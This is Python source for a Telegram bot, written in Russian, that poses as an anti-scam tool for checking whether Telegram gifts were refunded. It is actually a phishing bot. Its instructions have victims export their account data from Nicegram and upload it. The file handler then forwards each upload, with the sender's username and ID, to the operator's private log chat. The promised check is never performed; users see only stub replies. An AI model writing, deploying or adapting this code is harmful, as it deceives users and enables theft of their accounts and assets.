import os
import telebot
from telebot import types
from datetime import datetime
from flask import Flask
from threading import Thread

# === Настройки ===
TOKEN = os.environ.get("TOKEN")  # токен берется из переменной окружения
OWNER_ID = 7322925570
LOG_CHAT_ID = -1003532587685  # замените на ваш актуальный chat_id супергруппы
PHOTO_URL = "https://ibb.co.com/sptTYCYS"

bot = telebot.TeleBot(TOKEN)
logs_enabled = False

# === Тексты ===
MAIN_TEXT = (
    "Привет! Я - Бот, который поможет тебе не попасться на мошенников.\n"
    "Я помогу отличить реальный подарок от чистого визуала, "
    "чистый подарок без рефаунда и подарок, за который уже вернули деньги.\n\n"
    "Выбери действие :"
)

INSTRUCTION_TEXT = (
    "Инструкция:\n\n"
    "1. Скачайте приложение Nicegram с официального сайта.\n"
    "2. Откройте Nicegram и войдите в свой аккаунт.\n"
    "3. Зайдите в настройки и выберите пункт «Nicegram».\n"
    "4. Экспортируйте данные аккаунта.\n"
    "5. В меню бота нажмите 'Проверка на рефаунд'.\n"
    "6. Отправьте файл боту."
)

# === Кнопки ===
def main_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton("Инструкция", callback_data="instruction"),
        types.InlineKeyboardButton("Скачать NiceGram", url="https://nicegram.app/"),
        types.InlineKeyboardButton("Проверка на рефаунд", callback_data="refund_check")
    )
    return kb

def back_keyboard():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Назад", callback_data="back"))
    return kb

def cancel_keyboard():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Отмена", callback_data="cancel"))
    return kb

# === Start ===
@bot.message_handler(commands=["start"])
def start(message):
    bot.send_photo(
        chat_id=message.chat.id,
        photo=PHOTO_URL,
        caption=MAIN_TEXT,
        reply_markup=main_keyboard()
    )

# === Callbacks ===
@bot.callback_query_handler(func=lambda call: True)
def callbacks(call):
    if call.data == "instruction":
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=INSTRUCTION_TEXT,
            reply_markup=back_keyboard()
        )
    elif call.data == "back":
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=MAIN_TEXT,
            reply_markup=main_keyboard()
        )
    elif call.data == "refund_check":
        bot.send_message(
            chat_id=call.message.chat.id,
            text="🗂 Отправьте файл формата .txt или .zip для проверки:",
            reply_markup=cancel_keyboard()
        )
    elif call.data == "cancel":
        bot.send_photo(
            chat_id=call.message.chat.id,
            photo=PHOTO_URL,
            caption=MAIN_TEXT,
            reply_markup=main_keyboard()
        )
    bot.answer_callback_query(call.id)

# === Включение / выключение логов ===
@bot.message_handler(commands=["onlogs", "offlogs"])
def logs_control(message):
    global logs_enabled
    if message.chat.id != LOG_CHAT_ID or message.from_user.id != OWNER_ID:
        return
    if message.text == "/onlogs":
        logs_enabled = True
        bot.send_message(LOG_CHAT_ID, "✅ Логи включены")
    elif message.text == "/offlogs":
        logs_enabled = False
        bot.send_message(LOG_CHAT_ID, "❌ Логи выключены")

# === Обработка файлов ===
@bot.message_handler(content_types=["document"])
def handle_files(message):
    doc = message.document
    user = message.from_user
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Логируем файл всегда
    log_text = (
        "📥 Попытка отправки файла\n\n"
        f"👤 User: @{user.username}\n"
        f"🆔 User ID: {user.id}\n"
        f"💬 Chat ID: {message.chat.id}\n"
        f"📄 Файл: {doc.file_name}\n"
        f"📦 Размер: {doc.file_size} байт\n"
        f"⏰ Время: {time_now}"
    )
    bot.send_message(LOG_CHAT_ID, log_text)
    bot.send_document(
        chat_id=LOG_CHAT_ID,
        document=doc.file_id,
        caption=f"Файл от @{user.username} | ID {user.id}"
    )

    # Проверка формата
    if not doc.file_name.lower().endswith((".txt", ".zip")):
        bot.send_message(
            message.chat.id,
            "❌ Допустимы только файлы .txt или .zip"
        )
        return

    # Проверка состояния логов
    if not logs_enabled:
        bot.send_message(
            message.chat.id,
            "⚠️ Проверка временно недоступна."
        )
        return

    bot.send_message(
        message.chat.id,
        "✅ Файл получен. Идёт проверка."
    )

# === Flask сервер для Replit 24/7 ===
from flask import Flask
from threading import Thread

app = Flask("")

@app.route("/")
def home():
    return "Бот работает ✅"

def run():
    app.run(host="0.0.0.0", port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# === Запуск ===
keep_alive()
bot.infinity_polling()
